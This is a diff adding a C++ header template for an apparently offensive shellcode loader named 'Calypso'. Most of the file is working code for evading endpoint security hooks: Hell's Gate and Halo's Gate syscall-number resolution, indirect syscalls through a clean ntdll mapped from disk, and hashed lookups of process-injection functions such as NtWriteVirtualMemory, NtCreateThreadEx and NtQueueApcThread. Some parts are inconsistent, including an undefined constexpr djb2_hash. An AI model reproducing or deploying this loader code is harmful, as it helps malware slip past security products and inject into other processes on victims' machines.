@@ -1,0 +1,270 @@
+// Calypso loader - Syscall resolution stubs
+// Hell's Gate by @am0nsec & @smelly__vx
+// Halo's Gate by @sektor7
+// Indirect syscalls inspired by SysWhispers (@jthuraisamy)
+#pragma once
+
+#include <windows.h>
+#include <winternl.h>
+#include "obfuscate.hpp.in"
+
+// Syscall table entry
+struct SyscallEntry {
+    uint32_t hash;
+    uint16_t ssn;
+    void*    stub_addr;
+};
+
+// Global syscall table
+static SyscallEntry g_syscall_table[512];
+static int g_syscall_count = 0;
+
+// DJB2 hash for wide strings
+static uint32_t djb2_hashW(const wchar_t* str) {
+    uint32_t hash = 5381;
+    while (*str)
+        hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str++);
+    return hash;
+}
+
+static uint32_t djb2_hashA(const char* str) {
+    uint32_t hash = 5381;
+    while (*str)
+        hash = ((hash << 5) + hash) + static_cast<uint8_t>(*str++);
+    return hash;
+}
+
+// Get ntdll base from PEB
+static HMODULE get_ntdll() {
+#ifdef _WIN64
+    // TEB -> PEB -> Ldr -> InMemoryOrderModuleList
+    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
+#else
+    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
+#endif
+    auto ldr = peb->Ldr;
+    auto head = &ldr->InMemoryOrderModuleList;
+    auto entry = head->Flink->Flink; // ntdll is second
+    auto table_entry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+    return reinterpret_cast<HMODULE>(table_entry->DllBase);
+}
+
+{{#IF SYSCALL_HELLSGATE}}
+// Hell's Gate: resolve SSN by scanning for mov r10,rcx / mov eax,SSN pattern
+static bool hellsgate_resolve(HMODULE ntdll) {
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(ntdll);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(ntdll) + dos->e_lfanew);
+    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
+        reinterpret_cast<BYTE*>(ntdll) +
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    auto names = reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfNames);
+    auto funcs = reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfFunctions);
+    auto ords = reinterpret_cast<WORD*>(
+        reinterpret_cast<BYTE*>(ntdll) + exports->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < exports->NumberOfNames && g_syscall_count < 512; i++) {
+        auto name = reinterpret_cast<const char*>(
+            reinterpret_cast<BYTE*>(ntdll) + names[i]);
+
+        // Only Nt* functions (skip Zw*)
+        if (name[0] != 'N' || name[1] != 't') continue;
+
+        auto addr = reinterpret_cast<BYTE*>(ntdll) + funcs[ords[i]];
+
+        // Check for: mov r10, rcx (4C 8B D1) ; mov eax, SSN (B8 XX XX 00 00)
+        if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 &&
+            addr[3] == 0xB8) {
+            uint16_t ssn = *reinterpret_cast<uint16_t*>(addr + 4);
+            auto& entry = g_syscall_table[g_syscall_count++];
+            entry.hash = djb2_hashA(name);
+            entry.ssn = ssn;
+            entry.stub_addr = addr;
+        }
+{{#IF SYSCALL_HALOSGATE}}
+        // Halo's Gate: if hooked (jmp at entry), search neighbors
+        else if (addr[0] == 0xE9 || addr[0] == 0xFF) {
+            // Search up and down for unhooked neighbors
+            for (int j = 1; j < 32; j++) {
+                // Check neighbor down
+                BYTE* neighbor = addr + (j * 32); // approximate stub size
+                if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+                    neighbor[3] == 0xB8) {
+                    uint16_t neighbor_ssn = *reinterpret_cast<uint16_t*>(neighbor + 4);
+                    auto& entry = g_syscall_table[g_syscall_count++];
+                    entry.hash = djb2_hashA(name);
+                    entry.ssn = neighbor_ssn - static_cast<uint16_t>(j);
+                    entry.stub_addr = neighbor;
+                    break;
+                }
+                // Check neighbor up
+                neighbor = addr - (j * 32);
+                if (neighbor > reinterpret_cast<BYTE*>(ntdll) &&
+                    neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 &&
+                    neighbor[3] == 0xB8) {
+                    uint16_t neighbor_ssn = *reinterpret_cast<uint16_t*>(neighbor + 4);
+                    auto& entry = g_syscall_table[g_syscall_count++];
+                    entry.hash = djb2_hashA(name);
+                    entry.ssn = neighbor_ssn + static_cast<uint16_t>(j);
+                    entry.stub_addr = neighbor;
+                    break;
+                }
+            }
+        }
+{{#ENDIF}}
+    }
+    return g_syscall_count > 0;
+}
+{{#ENDIF}}
+
+{{#IF SYSCALL_INDIRECT}}
+// Indirect syscalls: read fresh ntdll from disk, parse exports
+static HMODULE g_clean_ntdll = nullptr;
+
+static bool indirect_resolve() {
+    // Map clean ntdll from disk
+    char ntdll_path[MAX_PATH];
+    char buf_sys[64];
+    // obf() version:
+    auto* sys32 = obf("C:\\Windows\\System32\\ntdll.dll");
+    lstrcpyA(ntdll_path, sys32);
+
+    HANDLE hFile = CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+    if (!hMap) { CloseHandle(hFile); return false; }
+
+    g_clean_ntdll = reinterpret_cast<HMODULE>(
+        MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
+    CloseHandle(hMap);
+    CloseHandle(hFile);
+
+    if (!g_clean_ntdll) return false;
+
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(g_clean_ntdll);
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(g_clean_ntdll) + dos->e_lfanew);
+    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
+        reinterpret_cast<BYTE*>(g_clean_ntdll) +
+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    auto names = reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfNames);
+    auto funcs = reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfFunctions);
+    auto ords = reinterpret_cast<WORD*>(
+        reinterpret_cast<BYTE*>(g_clean_ntdll) + exports->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < exports->NumberOfNames && g_syscall_count < 512; i++) {
+        auto name = reinterpret_cast<const char*>(
+            reinterpret_cast<BYTE*>(g_clean_ntdll) + names[i]);
+        if (name[0] != 'N' || name[1] != 't') continue;
+
+        auto addr = reinterpret_cast<BYTE*>(g_clean_ntdll) + funcs[ords[i]];
+        if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 &&
+            addr[3] == 0xB8) {
+            uint16_t ssn = *reinterpret_cast<uint16_t*>(addr + 4);
+            auto& entry = g_syscall_table[g_syscall_count++];
+            entry.hash = djb2_hashA(name);
+            entry.ssn = ssn;
+            // For indirect: call through the clean stub's full preamble
+            // (mov r10,rcx; mov eax,SSN; syscall; ret)
+            entry.stub_addr = addr;
+        }
+    }
+    return g_syscall_count > 0;
+}
+{{#ENDIF}}
+
+// Lookup SSN by hash
+static uint16_t get_ssn(uint32_t func_hash) {
+    for (int i = 0; i < g_syscall_count; i++) {
+        if (g_syscall_table[i].hash == func_hash)
+            return g_syscall_table[i].ssn;
+    }
+    return 0xFFFF;
+}
+
+// Get stub address for indirect syscalls
+static void* get_stub_addr(uint32_t func_hash) {
+    for (int i = 0; i < g_syscall_count; i++) {
+        if (g_syscall_table[i].hash == func_hash)
+            return g_syscall_table[i].stub_addr;
+    }
+    return nullptr;
+}
+
+// Initialize syscall resolution
+static bool init_syscalls() {
+{{#IF SYSCALL_INDIRECT}}
+    return indirect_resolve();
+{{#ENDIF}}
+{{#IF SYSCALL_HELLSGATE}}
+    return hellsgate_resolve(get_ntdll());
+{{#ENDIF}}
+}
+
+// Syscall invocation via assembly
+// For indirect: jmp through clean ntdll stub
+// For direct (Hell's/Halo's Gate): execute syscall inline
+extern "C" NTSTATUS syscall_invoke(uint16_t ssn, void* stub_addr, ...);
+
+// Platform-specific assembly stub
+#ifdef _MSC_VER
+// MSVC inline asm not supported on x64, use separate .asm or intrinsics
+// We'll use a function pointer approach instead
+#endif
+
+// Wrapper functions for common Nt* syscalls
+{{#IF SYSCALL_INDIRECT}}
+#define CALYPSO_SYSCALL(func_hash, ...) \
+    ([&]() -> NTSTATUS { \
+        uint16_t ssn = get_ssn(func_hash); \
+        void* stub = get_stub_addr(func_hash); \
+        if (!stub) return STATUS_UNSUCCESSFUL; \
+        using fn_t = NTSTATUS(NTAPI*)(__VA_ARGS__); \
+        return reinterpret_cast<fn_t>(stub)(__VA_ARGS__); \
+    })()
+{{#ENDIF}}
+
+// Hash constants for Nt functions
+static constexpr uint32_t HASH_NtAllocateVirtualMemory  = djb2_hash("NtAllocateVirtualMemory");
+static constexpr uint32_t HASH_NtProtectVirtualMemory   = djb2_hash("NtProtectVirtualMemory");
+static constexpr uint32_t HASH_NtCreateThreadEx         = djb2_hash("NtCreateThreadEx");
+static constexpr uint32_t HASH_NtWriteVirtualMemory     = djb2_hash("NtWriteVirtualMemory");
+static constexpr uint32_t HASH_NtOpenProcess             = djb2_hash("NtOpenProcess");
+static constexpr uint32_t HASH_NtFreeVirtualMemory       = djb2_hash("NtFreeVirtualMemory");
+static constexpr uint32_t HASH_NtQueryInformationProcess  = djb2_hash("NtQueryInformationProcess");
+static constexpr uint32_t HASH_NtQuerySystemInformation   = djb2_hash("NtQuerySystemInformation");
+static constexpr uint32_t HASH_NtCreateSection            = djb2_hash("NtCreateSection");
+static constexpr uint32_t HASH_NtMapViewOfSection         = djb2_hash("NtMapViewOfSection");
+static constexpr uint32_t HASH_NtUnmapViewOfSection       = djb2_hash("NtUnmapViewOfSection");
+static constexpr uint32_t HASH_NtClose                    = djb2_hash("NtClose");
+static constexpr uint32_t HASH_NtWaitForSingleObject      = djb2_hash("NtWaitForSingleObject");
+static constexpr uint32_t HASH_NtQueueApcThread           = djb2_hash("NtQueueApcThread");
+static constexpr uint32_t HASH_NtGetContextThread         = djb2_hash("NtGetContextThread");
+static constexpr uint32_t HASH_NtSetContextThread         = djb2_hash("NtSetContextThread");
+static constexpr uint32_t HASH_NtResumeThread             = djb2_hash("NtResumeThread");
+static constexpr uint32_t HASH_NtDelayExecution           = djb2_hash("NtDelayExecution");
+
+// Type definitions for Nt functions
+using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+using NtProtectVirtualMemory_t  = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+using NtCreateThreadEx_t        = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+using NtWriteVirtualMemory_t    = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+using NtWaitForSingleObject_t   = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+using NtQueueApcThread_t        = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, PVOID);
+using NtDelayExecution_t        = NTSTATUS(NTAPI*)(BOOLEAN, PLARGE_INTEGER);
+using NtClose_t                 = NTSTATUS(NTAPI*)(HANDLE);
+
+// Resolve and call via stub address (indirect syscalls)
+template<typename FnType>
+static FnType get_syscall_fn(uint32_t hash) {
+    void* addr = get_stub_addr(hash);
+    return reinterpret_cast<FnType>(addr);
+}
